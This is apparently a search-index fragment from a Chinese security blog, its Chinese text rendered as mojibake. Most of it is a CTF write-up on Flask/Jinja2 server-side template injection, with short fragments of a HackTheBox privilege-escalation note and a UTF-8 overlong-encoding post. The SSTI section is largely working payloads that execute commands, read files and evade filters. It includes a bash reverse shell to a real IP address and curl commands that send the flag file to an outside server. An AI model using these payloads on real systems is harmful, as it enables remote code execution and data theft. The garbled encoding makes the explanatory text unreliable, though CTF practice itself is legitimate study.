å¯åŠ¨ä¸¤ä¸ªç»ˆç«¯ï¼Œåœ¨ç¬¬ä¸€ä¸ªç»ˆç«¯ä¸­è¾“å…¥ 1./fuse ./ovlcap/lower ./gc åœ¨ç¬¬äºŒä¸ªç»ˆç«¯è¾“å…¥ 1./exp æˆåŠŸææƒä¸ºroot","link":"/2024/01/26/TwoMillion(HTB)/"},{"title":"SSTIæ¼æ´","text":"sstiå¸¸ç”¨å‘½ä»¤12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455__class__ ç±»çš„ä¸€ä¸ªå†…ç½®å±æ€§ï¼Œè¡¨ç¤ºå®ä¾‹å¯¹è±¡çš„ç±»ã€‚__base__ ç±»å‹å¯¹è±¡çš„ç›´æ¥åŸºç±»__bases__ ç±»å‹å¯¹è±¡çš„å…¨éƒ¨åŸºç±»ï¼ˆé™¤objectï¼‰ï¼Œä»¥å…ƒç»„å½¢å¼ï¼Œç±»å‹çš„å®ä¾‹é€šå¸¸æ²¡æœ‰å±æ€§ã€‚ __bases____mro__ æ­¤å±æ€§æ˜¯ç”±ç±»ç»„æˆçš„å…ƒç»„ï¼Œåœ¨æ–¹æ³•è§£ææœŸé—´ä¼šåŸºäºå®ƒæ¥æŸ¥æ‰¾åŸºç±»ã€‚__subclasses__() è¿”å›è¿™ä¸ªç±»çš„æ‰€æœ‰å­ç±»é›†åˆï¼ŒEach class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.__init__ åˆå§‹åŒ–ç±»ï¼Œè¿”å›çš„ç±»å‹æ˜¯function__globals__ ä½¿ç”¨æ–¹å¼æ˜¯ å‡½æ•°å.__globals__è·å–functionæ‰€å¤„ç©ºé—´ä¸‹å¯ä½¿ç”¨çš„moduleã€æ–¹æ³•ä»¥åŠæ‰€æœ‰å˜é‡ã€‚__dic__ ç±»çš„é™æ€å‡½æ•°ã€ç±»å‡½æ•°ã€æ™®é€šå‡½æ•°ã€å…¨å±€å˜é‡ä»¥åŠä¸€äº›å†…ç½®çš„å±æ€§éƒ½æ˜¯æ”¾åœ¨ç±»çš„__dict__é‡Œ__getattribute__() å®ä¾‹ã€ç±»ã€å‡½æ•°éƒ½å…·æœ‰çš„__getattribute__é­”æœ¯æ–¹æ³•ã€‚äº‹å®ä¸Šï¼Œåœ¨å®ä¾‹åŒ–çš„å¯¹è±¡è¿›è¡Œ.æ“ä½œçš„æ—¶å€™ï¼ˆå½¢å¦‚ï¼ša.xxx/a.xxx()ï¼‰ï¼Œéƒ½ä¼šè‡ªåŠ¨å»è°ƒç”¨__getattribute__æ–¹æ³•ã€‚å› æ­¤æˆ‘ä»¬åŒæ ·å¯ä»¥ç›´æ¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥è·å–åˆ°å®ä¾‹ã€ç±»ã€å‡½æ•°çš„å±æ€§ã€‚__getitem__() è°ƒç”¨å­—å…¸ä¸­çš„é”®å€¼ï¼Œå…¶å®å°±æ˜¯è°ƒç”¨è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œæ¯”å¦‚a['b']ï¼Œå°±æ˜¯a.__getitem__('b')__builtins__ å†…å»ºåç§°ç©ºé—´ï¼Œå†…å»ºåç§°ç©ºé—´æœ‰è®¸å¤šåå­—åˆ°å¯¹è±¡ä¹‹é—´æ˜ å°„ï¼Œè€Œè¿™äº›åå­—å…¶å®å°±æ˜¯å†…å»ºå‡½æ•°çš„åç§°ï¼Œå¯¹è±¡å°±æ˜¯è¿™äº›å†…å»ºå‡½æ•°æœ¬èº«ã€‚å³é‡Œé¢æœ‰å¾ˆå¤šå¸¸ç”¨çš„å‡½æ•°ã€‚__builtins__ä¸__builtin__çš„åŒºåˆ«å°±ä¸æ”¾äº†ï¼Œç™¾åº¦éƒ½æœ‰ã€‚__import__ åŠ¨æ€åŠ è½½ç±»å’Œå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å¯¼å…¥æ¨¡å—ï¼Œç»å¸¸ç”¨äºå¯¼å…¥osæ¨¡å—ï¼Œ__import__('os').popen('ls').read()]__str__() è¿”å›æå†™è¿™ä¸ªå¯¹è±¡çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç†è§£æˆå°±æ˜¯æ‰“å°å‡ºæ¥ã€‚url_for flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥è°ƒç”¨å½“å‰è„šæœ¬ä¸­çš„å‡½æ•°ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for.__globals__['__builtins__']å«æœ‰current_appã€‚get_flashed_messages flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for.__globals__['__builtins__']å«æœ‰current_appã€‚lipsum flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”lipsum.__globals__å«æœ‰osæ¨¡å—ï¼š{{lipsum.__globals__.os.popen('ls').read()}}current_app åº”ç”¨ä¸Šä¸‹æ–‡ï¼Œä¸€ä¸ªå…¨å±€å˜é‡ã€‚request å¯ä»¥ç”¨äºè·å–å­—ç¬¦ä¸²æ¥ç»•è¿‡ï¼ŒåŒ…æ‹¬ä¸‹é¢è¿™äº›ï¼Œå¼•ç”¨ä¸€ä¸‹ç¾½å¸ˆå‚…çš„ã€‚æ­¤å¤–ï¼ŒåŒæ ·å¯ä»¥è·å–openå‡½æ•°:request.__init__.__globals__['__builtins__'].open('/proc\\self\\fd/3').read()request.args.x1 getä¼ å‚request.values.x1 æ‰€æœ‰å‚æ•°request.cookies cookieså‚æ•°request.headers è¯·æ±‚å¤´å‚æ•°request.form.x1 postä¼ å‚ (Content-Type:applicaation/x-www-form-urlencodedæˆ–multipart/form-data)request.data postä¼ å‚ (Content-Type:a/b)request.json postä¼ json (Content-Type: application/json)config å½“å‰applicationçš„æ‰€æœ‰é…ç½®ã€‚æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥è¿™æ ·{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}self.__dict__ ä¿å­˜å½“å‰ç±»å®ä¾‹æˆ–å¯¹è±¡å®ä¾‹çš„å±æ€§å˜é‡é”®å€¼å¯¹å­—å…¸ï¼Œ{%print(&quot;DMIND&quot;)%} æ§åˆ¶è¯­å¥ä¸­ä¹Ÿèƒ½è¾“å‡ºæ‹¼æ¥å­—ç¬¦ï¼š{% set ind=dict(ind=a,ex=a)|join%} å˜é‡ind=indexè·å–å­—ç¬¦ï¼š{{lipsum|string|list|attr('pop')(18)}} ç›¸å½“äºï¼šlipsum|string|list|attr('pop')(18) è¾“å‡ºï¼š_ï¼ˆä¸‹åˆ’çº¿ï¼‰å¾—åˆ°æ•°å­—ï¼š{{lipsum|string|list|attr('index')('g')}} ç›¸å½“äºlipsum|string|list|attr('index')('g') è¾“å‡ºï¼š10è¿ç®—å‡ºå…¶ä»–æ•°å­—ï¼š{% set shiba=ten%2bten-two %} %2bæ˜¯URLç¼–ç åçš„åŠ å·å¾—åˆ°æ•°å­—ï¼š{{dict(a=a)|lower|list|count}}å¾—åˆ°16è¿ç®—å‡ºå…¶ä»–æ•°å­—ï¼š{{dict(aa=a)|lower|list|count-dict(a=a)|lower|list|count}}å¾—åˆ°1å¾—åˆ°ä»»æ„å­—ç¬¦ï¼š{{dict(dmind=a)|slice(1)|first|first}}å¾—åˆ°dmindè·å–__builtins__å±æ€§ï¼š{{lipsum.__globals__|attr('get')('__builtins__')}} åˆ©ç”¨get()ã€pop()è·å–å±æ€§ï¼Œç›¸å½“äºlipsum.__globals__.get('__builtins__')lipsum.__globals__.__builtins__ ç›¸å½“äº lipsum|attr('__globals__')|attr('get')('__builtins__')lipsum.__globals__.__builtins__.chr(95) ç›¸å½“äº lipsum|attr('__globals__')|attr('get')('__builtins__')|attr('get')('chr')(95)å¾—åˆ°chrå‡½æ•°ï¼š{%set chr=lipsum.__globals__.__builtins__.chr%}åˆ©ç”¨chr()å¾—åˆ°å­—ç¬¦ï¼š{{chr(47)~chr(32)}} 47æ˜¯/ 32æ˜¯ç©ºæ ¼ ~æ˜¯è¿æ¥ç¬¦åˆ©ç”¨osæ‰§è¡Œå‘½ä»¤ï¼šlipsum.__globals__.os.popen('dir').read() ç›¸å½“äº lipsum|attr('__globals__')|attr('get')('os')|attr('popen')('dir')|attr('read')()ç±»ä¼¼çš„ url_for['__globals__']['os']['popen']('dir').read()ç®€å•çš„è¯»å–æ–‡ä»¶ï¼šurl_for[&quot;__globa&quot;+&quot;ls__&quot;].__builtins__.open(&quot;flag.txt&quot;).read()åœ¨èƒ½æ‰§è¡Œevalæƒ…å†µä¸‹ï¼ševal(__import__('so'[::-1]).__getattribute__('syste'%2b'm')('curl http://xxx:4567?p=`cat /f*`')) sstiå¸¸ç”¨è¿‡æ»¤å™¨123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960attr(): attrç”¨äºè·å–å˜é‡(è¿‡æ»¤å™¨ä¸å˜é‡ä¹‹é—´ç”¨ç®¡é“ç¬¦å·ï¼ˆ|ï¼‰éš”å¼€ï¼Œæ‹¬å·ä¸­å¯ä»¥æœ‰å¯é€‰å‚æ•°ã€‚å¯ä»¥é“¾æ¥å¤šä¸ªè¿‡æ»¤å™¨ã€‚ä¸€ä¸ªè¿‡æ»¤å™¨çš„è¾“å‡ºåº”ç”¨äºä¸‹ä¸€ä¸ªè¿‡æ»¤å™¨) &quot;&quot;|attr(&quot;__class__&quot;) ç›¸å½“äº &quot;&quot;.__class__ dict(po=ll,p=abc)|join ï¼šè¿æ¥é”®åï¼Œæ‹¼æ¥å¾—åˆ°popint()ï¼šå°†å€¼è½¬æ¢ä¸ºintç±»å‹ï¼›float()ï¼šå°†å€¼è½¬æ¢ä¸ºfloatç±»å‹ï¼›lower()ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ï¼›upper()ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™ï¼›title()ï¼šæŠŠå€¼ä¸­çš„æ¯ä¸ªå•è¯çš„é¦–å­—æ¯éƒ½è½¬æˆå¤§å†™ï¼›capitalize()ï¼šæŠŠå˜é‡å€¼çš„é¦–å­—æ¯è½¬æˆå¤§å†™ï¼Œå…¶ä½™å­—æ¯è½¬å°å†™ï¼›trim()ï¼šæˆªå–å­—ç¬¦ä¸²å‰é¢å’Œåé¢çš„ç©ºç™½å­—ç¬¦ï¼›wordcount()ï¼šè®¡ç®—ä¸€ä¸ªé•¿å­—ç¬¦ä¸²ä¸­å•è¯çš„ä¸ªæ•°ï¼›reverse()ï¼šå­—ç¬¦ä¸²åè½¬ï¼›replace(value,old,new)ï¼š æ›¿æ¢å°†oldæ›¿æ¢ä¸ºnewçš„å­—ç¬¦ä¸²ï¼›truncate(value,length=255,killwords=False)ï¼šæˆªå–lengthé•¿åº¦çš„å­—ç¬¦ä¸²ï¼›striptags()ï¼šåˆ é™¤å­—ç¬¦ä¸²ä¸­æ‰€æœ‰çš„HTMLæ ‡ç­¾ï¼Œå¦‚æœå‡ºç°å¤šä¸ªç©ºæ ¼ï¼Œå°†æ›¿æ¢æˆä¸€ä¸ªç©ºæ ¼ï¼›escape()æˆ–eï¼šè½¬ä¹‰å­—ç¬¦ï¼Œä¼šå°†&lt;ã€&gt;ç­‰ç¬¦å·è½¬ä¹‰æˆHTMLä¸­çš„ç¬¦å·ã€‚æ˜¾ä¾‹ï¼šcontent|escapeæˆ–content|eã€‚safe()ï¼š ç¦ç”¨HTMLè½¬ä¹‰ï¼Œå¦‚æœå¼€å¯äº†å…¨å±€è½¬ä¹‰ï¼Œé‚£ä¹ˆsafeè¿‡æ»¤å™¨ä¼šå°†å˜é‡å…³æ‰è½¬ä¹‰ã€‚ç¤ºä¾‹ï¼š {{'&lt;em&gt;hello&lt;/em&gt;'|safe}}ï¼›list()ï¼šå°†å˜é‡åˆ—æˆåˆ—è¡¨ï¼›string()ï¼šå°†å˜é‡è½¬æ¢æˆå­—ç¬¦ä¸²ï¼›join()ï¼šå°†ä¸€ä¸ªåºåˆ—ä¸­çš„å‚æ•°å€¼æ‹¼æ¥æˆå­—ç¬¦ä¸²ã€‚ç¤ºä¾‹çœ‹ä¸Šé¢payloadï¼›abs()ï¼šè¿”å›ä¸€ä¸ªæ•°å€¼çš„ç»å¯¹å€¼ï¼›first()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼›last()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼›format(value,arags,*kwargs)ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚æ¯”å¦‚ï¼š{{ &quot;%s&quot; - &quot;%s&quot;|format('Hello?',&quot;Foo!&quot;) }}å°†è¾“å‡ºï¼šHelloo? - Foo!length()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—æˆ–è€…å­—å…¸çš„é•¿åº¦ï¼›sum()ï¼šè¿”å›åˆ—è¡¨å†…æ•°å€¼çš„å’Œï¼›sort()ï¼šè¿”å›æ’åºåçš„åˆ—è¡¨ï¼›default(value,default_value,boolean=false)ï¼šå¦‚æœå½“å‰å˜é‡æ²¡æœ‰å€¼ï¼Œåˆ™ä¼šä½¿ç”¨å‚æ•°ä¸­çš„å€¼æ¥ä»£æ›¿ã€‚ç¤ºä¾‹ï¼šname|default('xiaotuo')----å¦‚æœnameä¸å­˜åœ¨ï¼Œåˆ™ä¼šä½¿ç”¨xiaotuoæ¥æ›¿ä»£ã€‚boolean=Falseé»˜è®¤æ˜¯åœ¨åªæœ‰è¿™ä¸ªå˜é‡ä¸ºundefinedçš„æ—¶å€™æ‰ä¼šä½¿ç”¨defaultä¸­çš„å€¼ï¼Œå¦‚æœæƒ³ä½¿ç”¨pythonçš„å½¢å¼åˆ¤æ–­æ˜¯å¦ä¸ºfalseï¼Œåˆ™å¯ä»¥ä¼ é€’boolean=trueã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨oræ¥æ›¿æ¢ã€‚length()è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œåˆ«åæ˜¯count ssti_fuzzweb361_(å…¥é—¨ssti)å•¥éƒ½æ²¡æœ‰è¿‡æ»¤,æ‰€ä»¥å¯ä»¥ç”¨å¾ˆå¤šæ–¹æ³• 1234567{{url_for.__globals__.os.popen('cat /flag').read()}}{{url_for.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('cat /flag').read()&quot;)}}{{&quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}{{().__class__.__base__.__subclasses__()[].__init__.__globals__['__builtins__']['eval']('__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()')}} 123456789101112import requestsurl_base = &quot;http://26ecb42c-4859-430a-8b81-7476a70fba72.challenge.ctf.show?name=&quot;for i in range(500): url = url_base +&quot;{{''.__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;]}}&quot; response = requests.get(url=url) if response.status_code == 200: if 'os._wrap_close' in response.text: print(i) break print(i) 1{{().__class__.__base__.__subclasses__()[].__init__.__globals__['__builtins__']['eval']('__import__(\\&quot;os\\&quot;).popen(&quot;bash -c \\'bash -i &gt;&amp; /dev/tcp/81.71.13.76/5050 0&gt;&amp;1\\'&quot;).read()')}} web362_(æ•°å­—)å¯ä»¥ç”¨å…¨è§’ç»•è¿‡è¿‡æ»¤çš„æ•°å­—ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ä¸ç”¨æ•°å­—çš„payload 1{{&quot;&quot;.__class__.__base__.__subclasses__()[ï¼‘ï¼“ï¼’].__init__.__globals__['popen']('cat /flag').read()}} web363_(â€˜ â€œ)åˆ©ç”¨requst.argç»•è¿‡ 1{{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__[request.args.popen](request.args.cmd).read()}}&amp;popen=popen&amp;cmd=cat /flag web364_(â€˜ â€œ args)åˆ©ç”¨request.cookieç»•è¿‡ 123{{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__[request.cookies.popen](request.cookies.cmd).read()}}Cookie:popen=popen;cmd=cat /flag web365_([ ])å¢åŠ è¿‡æ»¤äº†**[ ]**,å¯ä»¥ç”¨__getitem()__ç»•è¿‡ 123456789().__class__.__mro__.__getitem__(-1){{().__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(132).__init__.__globals__.__getitem__(request.cookies.popen)(request.cookies.cmd).read()}} Cookie:cmd=cat /flag;popen=popen============================================================={{url_for.__globals__.os.popen(request.cookies.cmd).read()}}Cookie:cmd=cat /flag web366_(ä¸‹åˆ’çº¿)åˆ©ç”¨attrè¿‡æ»¤å™¨ç»•è¿‡ 1234{{lipsum.__globals__.os.popen('ls').read()}}{{(lipsum|attr(request.cookies.globals)).os.popen(reqeuest.cookies.cmd).read()}}Cookie:cmd=cat /flag;globals=__globals__ web367_(os)è¿‡æ»¤äº†å­—ç¬¦osï¼Œé‚£å°±æŠŠoså†™åˆ°requesté‡Œé¢å°±è¡Œäº† 12345x.__init__.__globals__['__builtins__'].eval(&quot;__import__('os').popen('ls /').read()&quot;){{(x|attr(request.cookies.init)|attr(request.cookies.globals)|attr(request.cookies.getitem))(request.cookies.builtins).eval(request.cookies.cmd)}}Cookie:init=__init__;globals=__globals__;getitem=__getitem__;builtins=__builtins__;cmd=__import__('os').popen('cat /flag').read() web368_(å¤§æ‹¬å·)è¿‡æ»¤äº†{{,}},å¯ä»¥ç”¨{% %} ä½¿ç”¨request.values.xï¼Œvalueså¯ä»¥æ¥å—GETå’ŒPOSTå½¢å¼çš„ä¼ å‚,æ³¨æ„get(request.values.b)ä¸­çš„getæ ¹æ®ä½ çš„ä¼ å‚æ–¹å¼æ¥çš„ 1234{% print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %}&amp;a=__globals__&amp;b=os&amp;c=cat /flag web369_(request)è¿‡æ»¤äº†request,åˆ©ç”¨dict()|joinæ‹¼æ¥æˆ‘ä»¬éœ€è¦çš„å­—ç¬¦ 12345678910{% set po=dict(po=a,p=a)|join%} # dict()|join æ‹¼æ¥é”®åçš„æ–¹å¼ï¼Œæ­¤å¤„å¾—åˆ°å˜é‡po=pop{% set a=(()|select|string|list)|attr(po)(24)%} #é€šè¿‡pop(24)é€‰æ‹©åˆ°â€œ_â€ä¸‹åˆ’çº¿å¹¶èµ‹å€¼ç»™a{% set ini=(a,a,dict(init=a)|join,a,a)|join()%} #ini=__init__{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%} #glo=__globals__{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%} #geti=__getitem__{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%} #built=__builtins__{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%} #x=q.__init__.__globals__.__getitem__('__builtins__'){% set chr=x.chr%} #chr=x.chr é€‰æ‹©åˆ°äº†chrå‡½æ•°ï¼Œchr=&lt;built-in function chr&gt;{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%} #ç»“åˆASCIIå’Œchrå‡½æ•°æ„é€ ã€‚file=/flag{%print(x.open(file).read())%} #åˆ©ç”¨openå‡½æ•°è¯»å– web370_(0-9)å°†ä¸Šä¸€é¢˜çš„æ•°å­—ç”¨å…¨è§’æ›¿æ¢ 12345678910{% set po=dict(po=a,p=a)|join%} {% set a=(()|select|string|list)|attr(po)(ï¼’ï¼”)%} {% set ini=(a,a,dict(init=a)|join,a,a)|join()%} {% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}{% set chr=x.chr%} {% set file=chr(ï¼”ï¼—)%2bchr(ï¼‘ï¼ï¼’)%2bchr(ï¼‘ï¼ï¼˜)%2bchr(ï¼™ï¼—)%2bchr(ï¼‘ï¼ï¼“)%}{%print(x.open(file).read())%} ä¹Ÿå¯ä»¥ç”¨countæˆ–è€…length 123456789101112131415{% set two=(dict(aa=a)|join|count)%}{% set three=(dict(aaa=a)|join|count)%}{% set four=(dict(aaaa=a)|join|count)%}{% set seven=(dict(aaaaaaa=a)|join|count)%}{% set eight=(dict(aaaaaaaa=a)|join|count)%}{% set nine=(dict(aaaaaaaaa=a)|join|count)%}{% set ten=(dict(aaaaaaaaaa=a)|join|count)%}{% set twofour=( two~four)|int%}{% set a=(()|select|string|list).pop(twofour)%}{% set globals=(a,a,dict(globals=s)|join,a,a)|join%}{% set init=(a,a,dict(init=v)|join,a,a)|join%}{% set builtins=(a,a,dict(builtins=c)|join,a,a)|join%}{% set a=(lipsum|attr(globals)).get(builtins)%}{% set chr=a.chr%}{% print a.open(chr((four~seven)|int)~chr((ten~two)|int)~chr((ten~eight)|int)~chr((nine~seven)|int)~chr((ten~three)|int)).read()%} web371_(print)è¿‡æ»¤äº†printï¼Œå°†flagå†…å®¹å‘é€åˆ°vps 1234567891011s='__import__(&quot;os&quot;).popen(&quot;curl http://81.71.13.76:5555?p=`cat /flag`&quot;).read()'def fun(s): t='' for i in range(len(s)): if i&lt;len(s)-1: t+='chr('+(str(ord(s[i])))+')%2b' else: t+='chr('+(str(ord(s[i])))+')' return tprint(fun(s))#å†å°†æ•°å­—è½¬æˆå…¨è§’ 1234567891011121314{% set po=dict(po=a,p=a)|join%} {% set a=(()|select|string|list)|attr(po)(ï¼’ï¼”)%} {% set ini=(a,a,dict(init=a)|join,a,a)|join()%} {% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}{% set chr=x.chr%}{% set cmd=chr(ï¼™ï¼•)%2bchr(ï¼™ï¼•)%2bchr(ï¼‘ï¼ï¼•)%2bchr(ï¼‘ï¼ï¼™)%2bchr(ï¼‘ï¼‘ï¼’)%2bchr(ï¼‘ï¼‘ï¼‘)%2bchr(ï¼‘ï¼‘ï¼”)%2bchr(ï¼‘ï¼‘ï¼–)%2bchr(ï¼™ï¼•)%2bchr(ï¼™ï¼•)%2bchr(ï¼”ï¼)%2bchr(ï¼“ï¼”)%2bchr(ï¼‘ï¼‘ï¼‘)%2bchr(ï¼‘ï¼‘ï¼•)%2bchr(ï¼“ï¼”)%2bchr(ï¼”ï¼‘)%2bchr(ï¼”ï¼–)%2bchr(ï¼‘ï¼‘ï¼’)%2bchr(ï¼‘ï¼‘ï¼‘)%2bchr(ï¼‘ï¼‘ï¼’)%2bchr(ï¼‘ï¼ï¼‘)%2bchr(ï¼‘ï¼‘ï¼)%2bchr(ï¼”ï¼)%2bchr(ï¼“ï¼”)%2bchr(ï¼™ï¼™)%2bchr(ï¼‘ï¼‘ï¼—)%2bchr(ï¼‘ï¼‘ï¼”)%2bchr(ï¼‘ï¼ï¼˜)%2bchr(ï¼“ï¼’)%2bchr(ï¼‘ï¼ï¼”)%2bchr(ï¼‘ï¼‘ï¼–)%2bchr(ï¼‘ï¼‘ï¼–)%2bchr(ï¼‘ï¼‘ï¼’)%2bchr(ï¼•ï¼˜)%2bchr(ï¼”ï¼—)%2bchr(ï¼”ï¼—)%2bchr(ï¼•ï¼–)%2bchr(ï¼”ï¼™)%2bchr(ï¼”ï¼–)%2bchr(ï¼•ï¼•)%2bchr(ï¼”ï¼™)%2bchr(ï¼”ï¼–)%2bchr(ï¼”ï¼™)%2bchr(ï¼•ï¼‘)%2bchr(ï¼”ï¼–)%2bchr(ï¼•ï¼•)%2bchr(ï¼•ï¼”)%2bchr(ï¼•ï¼˜)%2bchr(ï¼•ï¼“)%2bchr(ï¼•ï¼“)%2bchr(ï¼•ï¼“)%2bchr(ï¼•ï¼“)%2bchr(ï¼–ï¼“)%2bchr(ï¼‘ï¼‘ï¼’)%2bchr(ï¼–ï¼‘)%2bchr(ï¼™ï¼–)%2bchr(ï¼™ï¼™)%2bchr(ï¼™ï¼—)%2bchr(ï¼‘ï¼‘ï¼–)%2bchr(ï¼“ï¼’)%2bchr(ï¼”ï¼—)%2bchr(ï¼‘ï¼ï¼’)%2bchr(ï¼‘ï¼ï¼˜)%2bchr(ï¼™ï¼—)%2bchr(ï¼‘ï¼ï¼“)%2bchr(ï¼™ï¼–)%2bchr(ï¼“ï¼”)%2bchr(ï¼”ï¼‘)%2bchr(ï¼”ï¼–)%2bchr(ï¼‘ï¼‘ï¼”)%2bchr(ï¼‘ï¼ï¼‘)%2bchr(ï¼™ï¼—)%2bchr(ï¼‘ï¼ï¼)%2bchr(ï¼”ï¼)%2bchr(ï¼”ï¼‘)%}{%if x.eval(cmd)%}abc{%endif%} web372_(count)ç”¨ä¸Šä¸€é¢˜çš„å°†æ•°å­—å˜æˆå…¨è§’çš„payloadç…§æ ·å¯ä»¥ï¼Œ è¡¥å……baby flask12345'.','[','\\'','&quot;',''\\\\','+',':','_',&lt;/br&gt; 'chr','pop','class','base','mro','init','globals','get',&lt;/br&gt; 'eval','exec','os','popen','open','read',&lt;/br&gt; 'select','url_for','get_flashed_messages','config','request',&lt;/br&gt; 'count','length','ï¼','ï¼‘','ï¼’','ï¼“','ï¼”','ï¼•','ï¼–','ï¼—','ï¼˜','ï¼™','0','1','2','3','4','5','6','7','8','9' è¿™é“é¢˜çš„ç‰¹ç‚¹æ˜¯è¿‡æ»¤äº†æ•°å­—å’Œcontå’Œlengthï¼Œæ€ä¹ˆå¾—åˆ°æ•°å­—å‘¢ï¼Ÿ 123456789101112131415161718{% set test=(()|select|string|list)%}{% print(test) %}è¾“å‡ºå¦‚ä¸‹ï¼š['&lt;', 'g', 'e', 'n', 'e', 'r', 'a', 't', 'o', 'r', ' ', 'o', 'b', 'j', 'e', 'c', 't', ' ', 's', 'e', 'l', 'e', 'c', 't', '_', 'o', 'r', '_', 'r', 'e', 'j', 'e', 'c', 't', ' ', 'a', 't', ' ', '0', 'x', '7', 'f', '5', 'c', '7', 'b', '5', 'b', '9', 'b', 'a', '0', '&gt;']{% set test=(()|select|string|list).index('e')%}{% print(test) %}è¾“å‡ºå¦‚ä¸‹ï¼š2ä¸ºä»€ä¹ˆæ˜¯2å‘¢ï¼Ÿå…¶å®index('e')å°±æ˜¯è¡¨ç¤ºeåœ¨åˆ—è¡¨ä¸­çš„ç´¢å¼•ï¼Œé—®é¢˜åˆæ¥äº†ï¼Œæƒ³è¦å¾—åˆ°å€¼100æˆ–1000ï¼Œæƒ³è¦å¾—åˆ°æ›´å¤§çš„å€¼æ€ä¹ˆåŠå‘¢ï¼Œå¯ä»¥ç”¨è¿ç®—ç¬¦å·æ¯”å¦‚è¾“å‡ºå¦‚ä¸‹{% set test=(()|select|string|list).index('e')%}{% print(test*test) %}è¾“å‡ºå¦‚ä¸‹ï¼š4 è´´ä¸€ä¸‹wp 12345678910111213141516171819202122{% set id=dict(ind=a,ex=a)|join%}{% set pp=dict(po=a,p=a)|join%}{% set ls=dict(ls=a)|join%}{% set ppe=dict(po=a,pen=a)|join%}{% set gt=dict(ge=a,t=a)|join%}{% set cr=dict(ch=a,r=a)|join%}{% set nn=dict(n=a)|join%}{% set tt=dict(t=a)|join%}{% set ff=dict(f=a)|join%}{% set ooqq=dict(o=a,s=a)|join %}{% set rd=dict(re=a,ad=a)|join%}{% set five=(lipsum|string|list)|attr(id)(tt) %}{% set three=(lipsum|string|list)|attr(id)(nn) %}{% set one=(lipsum|string|list)|attr(id)(ff) %}{% set shiba=five*five-three-three-one %}{% set xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) %}{% set gb=(xiahuaxian,xiahuaxian,dict(glob=a,als=a)|join,xiahuaxian,xiahuaxian)|join %}{% set bin=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join %}{% set chcr=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %}{% set xiegang=chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%}{% set space=chcr(three*three*five-five-five-three) %}{% set shell=(ls,space,xiegang,dict(var=a)|join,xiegang,dict(www=a)|join,xiegang,dict(flask=a)|join)|join %}{{(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()}}","link":"/2023/11/10/SSTI%E6%BC%8F%E6%B4%9E/"},{"title":"UTF-8 Overlong Encoding","text":"å‰è¨€ï¼šè®°å½•ä»¥ä¸‹UTF-8 Overlong Encodingå¯¼è‡´çš„å®‰å…¨é—®é¢˜; å‚è€ƒ: 1ueå¸ˆå‚…;lzstarå¸ˆå‚…ï¼› UTF-8UTF-8 å°±æ˜¯ä¸€ç§å˜é•¿çš„ç¼–ç æ–¹å¼ã€‚å®ƒå¯ä»¥ä½¿ç”¨1~4ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªç¬¦å·ï¼Œæ ¹æ®ä¸åŒçš„ç¬¦å·è€Œå˜åŒ–å­—èŠ‚é•¿åº¦ UTF-8 çš„ç¼–ç è§„åˆ™: å¯¹äºå•å­—èŠ‚çš„ç¬¦å·ï¼Œå­—èŠ‚çš„ç¬¬ä¸€ä½è®¾ä¸º0ï¼Œåé¢7ä½ä¸ºè¿™ä¸ªç¬¦å·çš„ Unicode ç ã€‚å› æ­¤å¯¹äºè‹±è¯­å­—æ¯ï¼ŒUTF-8 ç¼–ç å’Œ ASCII ç 